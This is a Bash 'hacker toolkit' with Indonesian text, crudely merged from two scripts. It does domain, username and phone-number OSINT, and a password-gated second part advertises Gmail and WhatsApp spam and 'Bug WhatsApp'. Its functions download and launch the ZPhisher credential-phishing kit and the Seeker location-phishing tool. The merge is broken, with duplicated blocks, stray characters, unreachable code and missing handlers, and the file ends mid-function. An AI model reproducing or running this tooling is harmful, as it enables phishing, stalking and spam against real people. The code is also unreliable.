#!/bin/bash
# hacker_flay_v11.sh — Gabungan v9 + blackcatvip

#############################################
# Bagian utama dari hacker_flay_v9.sh
#############################################

#!/usr/bin/env bash
# CYBER FLAY v9 (SAFE) — Full features package (OSINT optimal, username check, phone lookup, JSO helper, utilities)
# SAFE edition: excludes defacement/exploit automation. Use only for legal/authorized testing & education.

set -euo pipefail
IFS=$'\n\t'

# Colors
RED='\033[1;31m'; GRN='\033[1;32m'; YEL='\033[1;33m'
BLU='\033[1;34m'; CYN='\033[1;36m'; MAG='\033[1;35m'; RST='\033[0m'

# Helper: detect command
has(){ command -v "$1" >/dev/null 2>&1; }

# Banner (seram hacker depan laptop)
banner(){
  clear
  cat <<'EOF'
      ______
   .-'      `-.
  /            \
 |,  .-.  .-.  ,|
 | )(_o/  \o_)( |
 |/     /\     \|
 (_     ^^     _)
  \__|IIIIII|__/
   | \IIIIII/ |
   \          /
    `--------`
EOF
  echo -e "${GRN}        CYBER FLAY v9${RST}"
  echo -e "${CYN}>>> TOOLS INI DIBUAT OLEH CYBER FLAY <<<${RST}\n"
}

pause(){ read -rp "Tekan Enter untuk lanjut..." _; }

# ---------------- OSINT: Optimal (domain) ----------------
osint_optimal(){
  read -rp "Masukkan domain/host (contoh: smpn2tuban.sch.id): " target
  [[ -z "$target" ]] && { echo "Domain kosong."; return; }
  echo -e "${YEL}\n=== OSINT OPTIMAL untuk: ${target} ===${RST}\n"

  echo -e "${BLU}--- WHOIS ---${RST}"
  curl -s "https://api.hackertarget.com/whois/?q=${target}" || echo "Whois gagal/terbatas"
  echo

  echo -e "${BLU}--- DNS Lookup (A/MX/NS) ---${RST}"
  curl -s "https://api.hackertarget.com/dnslookup/?q=${target}" || echo "DNS gagal"
  echo

  echo -e "${BLU}--- Resolve IP ---${RST}"
  ipaddr=""
  if has dig; then
    ipaddr=$(dig +short "$target" | grep -Eo '([0-9]{1,3}\.){3}[0-9]{1,3}' | head -n1 || true)
  elif has host; then
    ipaddr=$(host "$target" 2>/dev/null | awk '/has address/ {print $4; exit}' || true)
  else
    ipaddr=$(curl -s "https://api.hackertarget.com/dnslookup/?q=${target}" | awk '/A Record/ {getline; print $1; exit}' || true)
  fi
  if [[ -n "$ipaddr" ]]; then
    echo "IP: $ipaddr"
    echo -e "${BLU}--- IP Geolocation (ipapi.co) ---${RST}"
    curl -s "https://ipapi.co/${ipaddr}/json/" || echo "Geo lookup gagal"
  else
    echo "Tidak dapat resolv IP."
  fi
  echo

  echo -e "${BLU}--- Subdomains (crt.sh) ---${RST}"
  curl -s "https://crt.sh/?q=%25.${target}&output=json" | sed 's/},{/\\n/g' | sed 's/\"//g' | tr ',' '\\n' | grep -i "${target}" | sort -u | sed '/^$/d' | sed '1,1d' || echo "(crt.sh kosong/gagal)"
  echo

  echo -e "${BLU}--- Port Scan (lightweight hackertarget) ---${RST}"
  curl -s "https://api.hackertarget.com/nmap/?q=${target}" || echo "Port scan gagal/terbatas"
  echo

  echo -e "${BLU}--- HTTP Headers (curl -I) ---${RST}"
  if curl -Is --max-time 8 "https://${target}" 2>/dev/null | sed -n '1,40p'; then :; else
    if curl -Is --max-time 8 "http://${target}" 2>/dev/null | sed -n '1,40p'; then :; else
      echo "Tidak bisa ambil header."
    fi
  fi
  echo

  echo -e "${BLU}--- Website Tech (WhatCMS demo) ---${RST}"
  curl -s "https://api.whatcms.org/?key=DEMO&url=${target}" || echo "WhatCMS gagal/terbatas"
  echo

  echo -e "${GRN}=== Selesai OSINT OPTIMAL untuk: ${target} ===${RST}"
  pause
}

# ---------------- Username checker (single check per site) ----------------
username_check(){
  read -rp "Masukkan username panjang (contoh: Cyber Flay atau flay123): " user
  [[ -z "$user" ]] && { echo "Username kosong."; return; }
  # prefer variant without spaces for most sites
  user_nosp=$(echo "$user" | tr -d ' ')
  echo -e "${YEL}Memeriksa username: '${user}' (varian: ${user_nosp})${RST}"
  UA="Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 Chrome/125 Safari/537.36"

  sites=(
"instagram.com" "twitter.com" "tiktok.com/@" "github.com" "gitlab.com" "reddit.com/user" "facebook.com"
"pinterest.com" "medium.com/@" "stackoverflow.com/users" "quora.com/profile" "tumblr.com" "flickr.com/people"
"vimeo.com" "soundcloud.com" "open.spotify.com/user" "steamcommunity.com/id" "discord.com/users" "t.me"
"linkedin.com/in" "snapchat.com/add" "vk.com" "twitch.tv" "dailymotion.com" "about.me" "producthunt.com/@" 
"hackerone.com" "kaggle.com" "goodreads.com" "last.fm/user" "wattpad.com/user" "archive.org/details" "trello.com"
"notion.so" "canva.com" "dribbble.com" "behance.net" "deviantart.com" "slideshare.net" "tripadvisor.com/Profile"
"booking.com" "myanimelist.net/profile" "crunchyroll.com" "roblox.com/users" "patreon.com"
  )

  for s in "${sites[@]}"; do
    if [[ "$s" == *"/@"* || "$s" == *"/user" || "$s" == *"/users" || "$s" == *"/id" || "$s" == *"/in" || "$s" == *"/profile" || "$s" == *"/people" || "$s" == *"/add" || "$s" == *"/Profile" ]]; then
      url="https://${s}${user_nosp}"
    else
      url="https://${s}/${user_nosp}"
    fi
    code=$(curl -A "$UA" -m 8 -s -L -o /dev/null -w "%{http_code}" "$url" || echo "000")
    if [[ "$code" =~ ^(200|301|302)$ ]]; then
      echo -e "${GRN}[+] DITEMUKAN: ${url}${RST}"
    else
      echo -e "${RED}[-] TIDAK: ${url}${RST}"
    fi
  done
  pause
}

# ---------------- Phone lookup (many platforms, best-effort free) ----------------
phone_lookup(){
  read -rp "Masukkan nomor (contoh +6281234567890 atau 081234567890): " number
  [[ -z "$number" ]] && { echo "Nomor kosong."; return; }
  # normalize to +62... and 0...
  n_plus=$(echo "$number" | sed 's/^0/+62/; s/[^0-9+]//g')
  n_zero=$(echo "$number" | sed 's/^+62/0/; s/[^0-9]//g')
  echo -e "${YEL}Mencari nomor: ${n_plus} (varian 0: ${n_zero})${RST}"

  UA="Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 Chrome/125 Safari/537.36"

  platforms=(
"https://wa.me/${n_plus}" 
"https://t.me/+${n_plus}" 
"https://www.truecaller.com/search/${n_plus}" 
"https://www.facebook.com/search/top?q=${n_plus}" 
"https://www.reddit.com/search/?q=${n_plus}" 
"https://pastebin.com/search?q=${n_plus}" 
"https://search.strikepoint.io/?q=${n_plus}" 
"https://www.google.com/search?q=${n_plus}" 
  )

  for p in "${platforms[@]}"; do
    echo -e "${BLU}-- Checking: ${p} --${RST}"
    code=$(curl -A "$UA" -m 8 -s -o /dev/null -w "%{http_code}" "$p" || echo "000")
    if [[ "$code" =~ ^(200|301|302)$ ]]; then
      echo -e "${GRN}[+] POSSIBLE: ${p}${RST}"
    else
      echo -e "${RED}[-] Not found (or blocked): ${p}${RST}"
    fi
    sleep 1
  done

  echo -e "${GRN}Selesai pencarian nomor. Untuk hasil mendalam, gunakan tools berbayar/API resmi.${RST}"
  pause
}

# ---------------- JSO helper ----------------
jso_helper(){
  clear
  echo -e "${YEL}=== PEMBUATAN JSO (Helper) ===${RST}"
  read -rp "Tekan ENTER untuk membuka editor pembuatan HTML (haxor.my.id)..." _
  if has termux-open-url; then termux-open-url "https://haxor.my.id"; elif has xdg-open; then xdg-open "https://haxor.my.id"; else echo "Buka manual: https://haxor.my.id"; fi
  read -rp "Setelah selesai, ketik 'lanjutkan' untuk paste HTML (atau Enter batal): " L
  if [[ "$L" != "lanjutkan" ]]; then echo "Dibatalkan"; pause; return; fi
  echo "Tempel HTML kamu (akhiri CTRL+D):"
  tmp="$(mktemp)"; cat > "$tmp"
  read -rp "Nama output (tanpa ekstensi) [hasil]: " out; [[ -z "$out" ]] && out="hasil"
  mv "$tmp" "${out}.jso"
  echo -e "${GRN}[+] File dibuat: $(pwd)/${out}.jso${RST}"
  pause
}

# ---------------- Menu Lain ----------------
menu_lain(){
  while true; do
    clear
    echo -e "${BLU}===== MENU LAIN (Utilities) =====${RST}"
    echo "1) Cek Cuaca (wttr.in)"
    echo "2) Kalkulator (bc)"
    echo "3) Nama Hacker Random"
    echo "4) Chat AI (web)"
    echo "5) Base64 Encode/Decode"
    echo "6) Hash (MD5/SHA256)"
    echo "7) Password Generator"
    echo "8) IP Public"
    echo "9) Speedtest (if installed)"
    echo "10) Kalender"
    echo "0) Kembali"
    read -rp "Pilih (0-10): " U
    case "$U" in
      1) read -rp "Kota: " k; curl -s "wttr.in/${k}?format=3"; pause ;;
      2) echo "Ketik 'quit' untuk keluar"; while read -rp "expr> " e; do [[ "$e" == "quit" ]] && break; echo "$e" | bc; done; pause ;;
      3) arr=("DarkGhost" "CyberNinja" "ShadowX" "NullByte" "RootKing" "HexFlay" "AnonMaster"); echo "Nama: ${arr[$RANDOM % ${#arr[@]}]}"; pause ;;
      4) if has termux-open-url; then termux-open-url "https://chat.openai.com"; else echo "Buka: https://chat.openai.com"; fi; pause ;;
      5) read -rp "Teks: " t; echo "Encode: $(echo -n "$t" | base64)"; echo "Decode: $(echo -n "$t" | base64 -d 2>/dev/null)"; pause ;;
      6) read -rp "Teks: " t; echo "MD5: $(echo -n "$t"|md5sum|awk '{print $1}')"; echo "SHA256: $(echo -n "$t"|sha256sum|awk '{print $1}')"; pause ;;
      7) openssl rand -base64 12; pause ;;
      8) curl -s ifconfig.me || echo "Gagal ambil IP publik"; pause ;;
      9) if has speedtest-cli; then speedtest-cli; elif has speedtest; then speedtest; else echo "Install speedtest via pkg install speedtest"; fi; pause ;;
      10) cal; pause ;;
      0) break ;;
      *) echo "Pilihan tidak valid"; pause ;;
    esac
  done
}

# ---------------- Dark Web (info) ----------------
darkweb_info(){
  clear
  echo -e "${RED}== DARK WEB (EDUKASI) ==${RST}"
  echo "- Link informasional (mirror). Untuk akses .onion yang sebenarnya gunakan Tor/Orbot."
  read -rp "Tekan Enter untuk buka Hidden Wiki (info)..." _
  if has termux-open-url; then termux-open-url "https://thehiddenwiki.org/"; elif has xdg-open; then xdg-open "https://thehiddenwiki.org/"; else echo "Buka manual: https://thehiddenwiki.org/"; fi
  pause
}

# ---------------- About ----------------
about_menu(){
  clear
  banner
  echo "Versi: v9 (SAFE)"
  echo "Author: FLAY"
  echo "Gunakan hanya untuk tujuan legal/edukasi/bug bounty."
  pause
}

# ---------------- Main ----------------
main(){
  while true; do
    clear
    banner
    echo -e "${GRN}┌────────────────────────────────────────────┐${RST}"
    echo -e "${GRN}│  ${YEL}[1] OSINT - Optimal (domain)         ${GRN}│${RST}"
    echo -e "${GRN}│  ${YEL}[2] OSINT - Username Checker        ${GRN}│${RST}"
    echo -e "${GRN}│  ${YEL}[3] OSINT - Phone Lookup           ${GRN}│${RST}"
    echo -e "${GRN}│  ${YEL}[4] Pembuatan JSO (helper)        ${GRN}│${RST}"
    echo -e "${GRN}│  ${YEL}[5] Menu Lain (utilities)         ${GRN}│${RST}"
    echo -e "${GRN}│  ${YEL}[6] Dark Web (edu)                ${GRN}│${RST}"
    echo -e "${GRN}│  ${YEL}[7] About                          ${GRN}│${RST}"
    echo -e "${GRN}│  ${YEL}[0] Keluar                         ${GRN}│${RST}"
    echo -e "${GRN}└────────────────────────────────────────────┘${RST}"
    read -rp "Pilih menu: " c
    case "$c" in
      1) osint_optimal ;;
      2) username_check ;;
      3) phone_lookup ;;
      4) jso_helper ;;
      5) menu_lain ;;
      6) darkweb_info ;;
      7) about_menu ;;
      0) echo "Terima kasih!"; exit 0 ;;
      *) echo "Pilihan tidak valid"; pause ;;
    esac
  done
}

main


#############################################
# Tambahan fitur dari blackcatvip.sh
#############################################

#!/bin/bash
# ------------------------------
# Warna Neon
# ------------------------------
red_neon="\e[1;5;91m"     # Merah neon
yellow_neon="\e[1;5;93m"  # Kuning neon
reset="\e[0m"             # Reset

# ------------------------------
# Fungsi Banner Awal
# ------------------------------
#!/bin/bash
# ------------------------------
# Warna Neon
# ------------------------------
red_neon="\e[1;5;91m"     # Merah neon
yellow_neon="\e[1;5;93m"  # Kuning neon
reset="\e[0m"             # Reset

# ------------------------------
# Fungsi Banner Awal
# ------------------------------
show_banner() {
  clear
  echo -e "${red_neon}┏━━━━━━━━━━● [LICENSE] ●━━━━━━━━━━━━━━━━━━━━━━━━━┓${reset}"
  echo -e "${yellow_neon}┃      ▄▀▀▀▄                                     ┃${reset}"
  echo -e "${yellow_neon}┃      █   █                                     ┃${reset}"
  echo -e "${yellow_neon}┃     ███████         ▄▀▀▄  |  ╦  ╔═╗╔═╗╦╔╗╔     ┃${reset}"
  echo -e "${yellow_neon}┃     ██─▀─██  █▀█▀▀▀▀█  █  |  ║  ║ ║║ ╦║║║║     ┃${reset}"
  echo -e "${yellow_neon}┃     ███▄███  ▀ ▀     ▀▀   |  ╩═╝╚═╝╚═╝╩╝╚╝     ┃${reset}"
  echo -e "${red_neon}┃     ------------------------- 2024 - 2025      ┃${reset}"
  echo -e "${red_neon}┃             TOOLS BY BLACKCAT                  ┃${reset}"
  echo -e "${red_neon}┃              ______________________            ┃${reset}"
  echo -e "${red_neon}┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛${reset}"
  echo -e "${yellow_neon}┃          YT: MRS: MRS404                       ┃${reset}"
  echo -e "${yellow_neon}┃      JIKA BELUM PUNYA ID USER TANYA MRS!!      ┃${reset}"
  echo -e "${red_neon}┏━━━━━━━━━━━━━━━━━━━━━┓    ┏━━━━━━━━━━━━━━━━━━━━━┓${reset}"
  echo -e "${red_neon}┃  MENU LOGIN TOOLS   ┃    ┃   INFORMASI TOOLS   ┃${reset}"
  echo -e "${red_neon}┗━━━━━━━━━━━━━━━━━━━━━┛    ┗━━━━━━━━━━━━━━━━━━━━━┛${reset}"
  echo -e "${yellow_neon}┃1) LOGIN             ┃    ┃  ATTACK             ┃${reset}"
  echo -e "${yellow_neon}┃2) KELUAR            ┃    ┃  OSINT              ┃${reset}"
  echo -e "${yellow_neon}┃                     ┃    ┃  PHISHING           ┃${reset}"
  echo -e "${red_neon}┗━━━━━━━━━━━━━━━━━━━━━┛    ┗━━━━━━━━━━━━━━━━━━━━━┛${reset}"
  echo -ne "${yellow_neon}Pilih Menu [1-2]: ${reset}"
  read choice

  case $choice in
    1) login_tools ;;   # kalau pilih login → fungsi login
    2) echo -e "${red_neon}Keluar...${reset}"; exit 0 ;;
    *) echo -e "${red_neon}Pilihan tidak valid!${reset}"; sleep 1; show_banner ;;
  esac
}

login_tools() {
  clear
  echo -e "${red_neon}┏━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓${reset}"
  echo -e "${red_neon}┃               ${yellow_neon}LOGIN TOOLS V3.2${red_neon}               ┃${reset}"
  echo -e "${red_neon}┣━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┫${reset}"
  echo -ne "${yellow_neon}┃ Masukkan ID       : ${reset}"
  read user_id
  echo -ne "${yellow_neon}┃ Masukkan Password : ${reset}"
  read -s user_pw
  echo ""
  echo -e "${red_neon}┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛${reset}"

  enc_id="MTMwMTI3"
  enc_pw="TVJTMTI="

  # Decode saat pengecekan
  real_id=$(echo "$enc_id" | base64 -d)
  real_pw=$(echo "$enc_pw" | base64 -d)

  if [[ "$user_id" == "$real_id" && "$user_pw" == "$real_pw" ]]; then
    clear
    echo -e "${yellow_neon}┏━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓${reset}"
    echo -e "${yellow_neon}┃       [✔] LOGIN BERHASIL! SELAMAT DATANG    ┃${reset}"
    echo -e "${yellow_neon}┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛${reset}"
    sleep 2
    show_menu   # balik ke banner/menu utama
  else
    clear
    echo -e "${red_neon}┏━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓${reset}"
    echo -e "${red_neon}┃     [✘] LOGIN GAGAL! ID/PASSWORD SALAH      ┃${reset}"
    echo -e "${red_neon}┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛${reset}"
    sleep 2
    login_tools   # ulangi login lagi
  fi
}

# ------------------------------
# Start Program
# ------------------------------
show_banner

# Kode warna untuk teks
BLUE='\033[1;94m'
GREEN='\033[1;92m'
RED='\033[1;91m'
CYAN='\033[1;96m'
YELLOW='\033[1;93m'
MAGENTA='\033[1;95m'
WHITE='\033[1;97m'

# Kode warna untuk latar belakang
BG_BLUE='\033[1;44m'
BG_GREEN='\033[1;42m'
BG_RED='\033[1;41m'
BG_CYAN='\033[1;46m'
BG_YELLOW='\033[1;43m'
BG_MAGENTA='\033[1;45m'
BG_WHITE='\033[1;47m'

# Kode untuk mengatur gaya teks
BOLD='\033[1m'
UNDERLINE='\033[4m'
BLINK='\033[5m'

# Kode untuk menghapus warna dan gaya
NC='\033[0m'

WHATSAPP_CHANNEL_URL="https://whatsapp.com/channel/0029Vb5eMzT0rGiNJ0GFSD1T"
API_KEY="YOUR_API_KEY" # cari apikey sendiri

command_exists() {
  command -v "$1" >/dev/null 2>&1
}

banner() {
clear
 if command_exists figlet; then
    figlet -f slant "MRSTols" | lolcat
  else
  clear
    echo -e "${CYAN}===== MRSTols =====${NC}"
    
    echo "©MRSOfficial"
  fi
  echo -e "${BLUE}"
  echo "     ╭────────────────────────────────────╮"
  echo "     │    [] LOADING []   │"11
  echo "     ╰────────────────────────────────────╯"
  echo -e "${RED}"
  sleep 2
  clear
  if command_exists figlet; then
    figlet -f slant "BLACKCAT" | lolcat
  else
    echo -e "${CYAN}===== BLACKCAT =====${NC}"
    sleep 1
    clear
  fi
}

show_menu() {
  # Warna Neon
  red_neon="\e[1;5;91m"
  yellow_neon="\e[1;5;93m"
  green_neon="\e[1;92m"
  cyan_neon="\e[1;96m"
  purple_neon="\e[1;95m"
  reset="\e[0m"

  # Ambil IP publik
  PUBLIC_IP=$(curl -s https://api.ipify.org)

  DEV_NAME=$(echo -e "\x4d\x52\x53\x20\x4f\x46\x46\x49\x43\x49\x41\x4c\xe2\x9c\x93")

  clear
  echo -e "${cyan_neon}"
  cat << "EOF"
                       ⢀⣀⣠⣤⣤⣀                       
                   ⣠⣤⣿⠋⠩⡁⣽⠛⢷⣤⡀                    
                  ⣰⣟⠈⠘⠃⠐⠒⡿⠚⠁⢸⣿⣆                   
                 ⣼⣛⢦⣼⣥⣀⣀ ⢶ ⡀⠻⣌⠙⣆                  
                ⣰⣿⠵⣿⠏ ⠉⠡   ⠁⡀  ⡿⢶                 
               ⢀⡏⠐⠒⡛⢠⢠⣾⣣⣶⣶⣴⣶⣤⡘⠣⡄⠈⣧⡀               
              ⢀⣾⣻⣷⣶⣶⣾⣾⣿⣿⣿⣿⣿⣿⣿⣻⣷⣄⠐⠘⢳⡀              
              ⠘⣸⡿⣏⣿⣿⣾⣿⣿⣿⣿⣿⣿⡿⢿⣍⡍⣿⣿⣿⣟⡃              
               ⢻⡵⢿⣿⣿⣿⠉⠹⠿⠃⠈⣹⣿⣽⣿⣿⣿⡿⢻⣸⠁              
            ⣀⣀⣠⣬⠿⠧⣽⡛⢿⣧⣤⣼⠟⡛⢻⣿⣿⣿⣿⡄ ⣿⣧⣀              
          ⢀⣴⡟⣹⣿⡟⠦⡄⢠⣌⡈⣻⣿⣶⣾⣿⣿⣿⣿⣛⣻⣏⡉⣨⠙⠻⠳⢶⣄           
         ⡸⠟⣧⢶⡘⣻⠃⠃⣴⣿⣿⣷⣿⣿⣿⣿⣿⣿⣿⢿⣻⣿⣿⣿⣿⣦⣶⡐⠄⠛⢦          
       ⢠⣞⡁⡾⣿⣿⣤⣤⣤⢦⣤⣴⣥⣤⠤⠤⣤⡤⠄⠤⠬⢤⣤⠤⠤⠤⠶⣤⣶⣶⣶⣷⡌⠷⡄        
     ⣠⣴⠉⣉⡻⣯⠅⠙⠏⠉⠁  ⠉⠁               ⠉⠉⢻⣿⡟⠦⠿⣆       
   ⣠⡿⢉⣼⣽⡟⠛⠂ ⠁                         ⣿⠓⣶⣆⡘⢷      
  ⢀⣟⣿⡯⢿⣿⣏⣹⣶⠖                         ⠠⣿⠅⢀⠋⢁⢰⣧⡀    
  ⣞⢻⣿⣿⣾⣌⣹⡛⠇⣰                          ⢻⣶⡿⣴⣬⣛ ⣹⡄   
  ⠑⣾⡿⣿⠙⠛⠏ ⠁⣹                          ⠺⣿⣯⠛⣿⣨⡟⡅⣧⡀  
   ⠈⠙⠛⠸ ⠠⠶⠖⠋                           ⣟⠹⢷⣼⣍⠤⡄⡩⣽  
                                      ⢰⢯⣀⣄⣉⡙⣷⣿⣷⣾⣠⣶
⣤⣤⠤⠤                                  ⠐⣷⣟⣻⢾⣷⣟⣻⣿⣿⣿⣿
⢠⣶⢠⡿⢶⣇ ⢀ ⡀⢤⡀                          ⣐⠟⠛⠿⢷⣾⠿⢧⣧⣤⣿⣿
⠉⠉⠉⢋⠙⣿⠹⠘⠛⠃ ⠐⠖⠲⢾⢿⣿⡟⣟⣿⡿⣿⣿⡿⠟⢶⣶⣾⢶⣶⣶⡶⠶⠶⠿⠒⠻⠟⠛⠁ ⠓⢈⠰⡿⣭⡏⢭⣿⣿
 ⠐⠒⠋⣧⠋⠉⠲⠞⠤⠄⠉⠑⠒⠿⠿⠟⠷⠿⠛⠛⠏ ⠭⢞⠋⠉⠻⠿⠃⠱⠄⢤ ⠐⠒⠈⠁    ⢸ ⣿⡗  ⠻⠹    
EOF
  echo -e "${reset}"

  echo -e "${red_neon}┏━━━━━━━━━━━━━━━━━━━● [ MENU 1 ] ●━━━━━━━━━━━━━━━━━━━┓${reset}"
  echo -e "${yellow_neon}┃ [ 1 ] Lacak Nomor (eWallet)                        ┃${reset}"
  echo -e "${yellow_neon}┃ [ 2 ] MR.HOLMES                                    ┃${reset}"
  echo -e "${yellow_neon}┃ [ 3 ] Perkiraan Cuaca                              ┃${reset}"
  echo -e "${yellow_neon}┃ [ 4 ] Cek Khodam                                   ┃${reset}"
  echo -e "${yellow_neon}┃ [ 5 ] Lacak IP Lokasi / Web                        ┃${reset}"
  echo -e "${red_neon}┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛${reset}"
  echo

  echo -e "${red_neon}┏━━━━━━━━━━━━━━━━━━━● [ MENU 2 ] ●━━━━━━━━━━━━━━━━━━━┓${reset}"
  echo -e "${yellow_neon}┃ [ 6 ] Cek Kebocoran Gmail                          ┃${reset}"
  echo -e "${yellow_neon}┃ [ 7 ] Info Tools                                   ┃${reset}"
  echo -e "${yellow_neon}┃ [ 8 ] Spam Gmail                                   ┃${reset}"
  echo -e "${yellow_neon}┃ [ 9 ] Kalkulator                                   ┃${reset}"
  echo -e "${yellow_neon}┃ [10 ] Spam WhatsApp                                ┃${reset}"
  echo -e "${red_neon}┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛${reset}"
  echo

  echo -e "${red_neon}┏━━━━━━━━━━━━━━━━━━━● [ MENU 3 ] ●━━━━━━━━━━━━━━━━━━━┓${reset}"
  echo -e "${yellow_neon}┃ [11 ] ASCII Art Generator                          ┃${reset}"
  echo -e "${yellow_neon}┃ [12 ] Bug WhatsApp                                 ┃${reset}"
  echo -e "${yellow_neon}┃ [13 ] ZPhisher                                     ┃${reset}"
  echo -e "${yellow_neon}┃ [14 ] Seeker                                       ┃${reset}"
  echo -e "${yellow_neon}┃ [15 ] HunterNum                                    ┃${reset}"
  echo -e "${yellow_neon}┃ [ 0 ] Close                                        ┃${reset}"
  echo -e "${red_neon}┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛${reset}"
  echo

  echo -e "${red_neon}┏━━━━━━━━━━━━━━━━━━━● [ INFO ] ●━━━━━━━━━━━━━━━━━━━━┓${reset}"
  echo -e "${yellow_neon}┃ ⏰ JAM: $(date +'%H:%M:%S')   DEV: $DEV_NAME    ┃${reset}"
  echo -e "${yellow_neon}┃ IP PUBLIK: ${PUBLIC_IP}                 ┃${reset}"
  echo -e "${red_neon}┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛${reset}"
}

seeker() {
  # Warna Neon
  red_neon="\e[1;5;91m"
  yellow_neon="\e[1;5;93m"
  green_neon="\e[1;92m"
  cyan_neon="\e[1;96m"
  reset="\e[0m"

  clear
  echo -e "${red_neon}┏━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓${reset}"
  echo -e "${red_neon}┃             ${yellow_neon}SEEKER SETUP & RUN${red_neon}              ┃${reset}"
  echo -e "${red_neon}┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛${reset}"
  echo

  SEEKER_DIR="$HOME/seeker"

  if [ ! -d "$SEEKER_DIR" ]; then
      echo -e "${yellow_neon}┏━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓${reset}"
      echo -e "${yellow_neon}┃ [!] Seeker belum terinstall. Installing...   ┃${reset}"
      echo -e "${yellow_neon}┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛${reset}"
      sleep 1

      # Update & install paket penting
      pkg update -y && pkg upgrade -y
      pkg install git python openssh php -y

      # Clone repo seeker
      git clone https://github.com/thewhiteh4t/seeker.git "$SEEKER_DIR"

      # Masuk ke folder seeker & install
      cd "$SEEKER_DIR" || { echo -e "${red_neon}Gagal masuk folder Seeker${reset}"; return; }
      chmod +x install.sh
      bash install.sh

      # Install dependencies Python sekali saja
      pip install psutil requests

      echo -e "${green_neon}┏━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓${reset}"
      echo -e "${green_neon}┃ [✔] Seeker berhasil diinstall!               ┃${reset}"
      echo -e "${green_neon}┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛${reset}"
  else
      echo -e "${green_neon}┏━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓${reset}"
      echo -e "${green_neon}┃ [✔] Seeker sudah terinstall. Menjalankan... ┃${reset}"
      echo -e "${green_neon}┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛${reset}"
      cd "$SEEKER_DIR" || { echo -e "${red_neon}Gagal masuk folder Seeker${reset}"; return; }
  fi

  # Jalankan Seeker
  python3 seeker.py

  # Balik ke menu utama
  echo -e "${cyan_neon}┏━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓${reset}"
  echo -e "${cyan_neon}┃ [↩] Kembali ke menu utama...                 ┃${reset}"
  echo -e "${cyan_neon}┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛${reset}"
  read -p "Tekan ENTER untuk melanjutkan..."
}

zphisher() {
  # Warna Neon
  red_neon="\e[1;5;91m"
  yellow_neon="\e[1;5;93m"
  green_neon="\e[1;92m"
  cyan_neon="\e[1;96m"
  reset="\e[0m"

  clear
  echo -e "${red_neon}┏━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓${reset}"
  echo -e "${red_neon}┃            ${yellow_neon}ZPHISHER SETUP & RUN${red_neon}             ┃${reset}"
  echo -e "${red_neon}┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛${reset}"
  echo

  ZPHISHER_DIR="$HOME/zphisher"

  if [ ! -d "$ZPHISHER_DIR" ]; then
      echo -e "${yellow_neon}┏━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓${reset}"
      echo -e "${yellow_neon}┃ [!] Zphisher belum terinstall. Installing... ┃${reset}"
      echo -e "${yellow_neon}┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛${reset}"
      sleep 1

      # Update & install paket
      apt update -y && apt upgrade -y
      apt install python3 git curl wget unzip php -y

      # Clone repo
      git clone --depth=1 https://github.com/htr-tech/zphisher.git "$ZPHISHER_DIR"

      echo -e "${green_neon}┏━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓${reset}"
      echo -e "${green_neon}┃ [✔] Zphisher berhasil diinstall!             ┃${reset}"
      echo -e "${green_neon}┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛${reset}"

      cd "$ZPHISHER_DIR" || { echo -e "${red_neon}Gagal masuk folder Zphisher${reset}"; return; }
  else
      echo -e "${green_neon}┏━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓${reset}"
      echo -e "${green_neon}┃ [✔] Zphisher sudah terinstall. Menjalankan.. ┃${reset}"
      echo -e "${green_neon}┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛${reset}"
      cd "$ZPHISHER_DIR" || { echo -e "${red_neon}Gagal masuk folder Zphisher${reset}"; return; }
  fi

  # Jalankan Zphisher
  bash zphisher.sh

  # Balik ke menu utama
  echo -e "${cyan_neon}┏━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓${reset}"
  echo -e "${cyan_neon}┃ [↩] Kembali ke menu utama...                 ┃${reset}"
  echo -e "${cyan_neon}┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛${reset}"
